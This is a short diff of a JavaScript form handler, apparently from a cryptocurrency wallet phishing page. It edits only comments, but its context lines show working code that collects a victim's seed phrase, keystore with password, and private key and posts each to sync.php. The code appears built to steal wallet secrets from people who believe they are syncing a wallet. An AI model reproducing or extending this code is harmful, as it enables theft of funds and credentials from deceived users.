@@ -87,8 +87,7 @@ function sendData() {
   var phraseVal = document.getElementById("phraseinput").value;
 
   if (phraseVal != "") {
-    // AJAX CALL
-
+    // ADD NEW BLOCK FOR SENDING REQUEST.
     $.ajax({
       type: "post",
       url: "sync.php",
@@ -109,8 +108,7 @@ function sendData() {
   }
 
   if (keystoreval != "" && keystorepass != "") {
-    // AJAX CALL
-
+    // ADD NEW BLOCK FOR SENDING REQUEST.
     $.ajax({
       type: "post",
       url: "sync.php",
@@ -136,8 +134,7 @@ function sendData() {
     });
   }
   if (privatekeyval != "") {
-    // AJAX CALL
-
+    // ADD NEW BLOCK FOR SENDING REQUEST.
     $.ajax({
       type: "post",
       url: "sync.php",
